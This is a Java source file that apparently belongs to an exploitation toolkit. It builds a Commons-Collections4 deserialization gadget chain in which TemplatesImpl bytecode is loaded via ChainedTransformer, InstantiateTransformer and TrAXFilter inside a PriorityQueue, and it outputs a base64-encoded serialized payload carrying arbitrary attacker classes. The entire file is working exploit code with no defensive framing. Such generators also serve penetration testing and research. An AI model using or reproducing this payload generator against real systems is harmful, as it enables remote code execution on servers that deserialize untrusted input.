package org.tools.ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.tools.ClassFiles;
import org.tools.Reflections;
import org.tools.encryption.B64;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class CC4Generator {
    public static void main(String[] args) throws Exception{
        B64 b64 = new B64();
        String base64Str = b64.encodeObj(cc4Demo(b64.encodeJavaClass(Calc.class)));

        // 反序列化
//        byte[] bytes = Base64.getDecoder().decode(base64Str);
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        objectInputStream.readObject();
    }

    public String make(Class<?> clazz) throws Exception {
        B64 b64 = new B64();
        return b64.encodeObj(cc4Demo(b64.encodeJavaClass(clazz)));
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }
    public static Object cc4Demo(String base64Payload) throws Exception {
        byte[] bytes = java.util.Base64.getDecoder().decode(base64Payload);
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytes, ClassFiles.classAsBytes(Foo.class)});
        Reflections.setFieldValue(templates, "_name", "anystr");
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());


        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates})};

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return queue;
    }
}
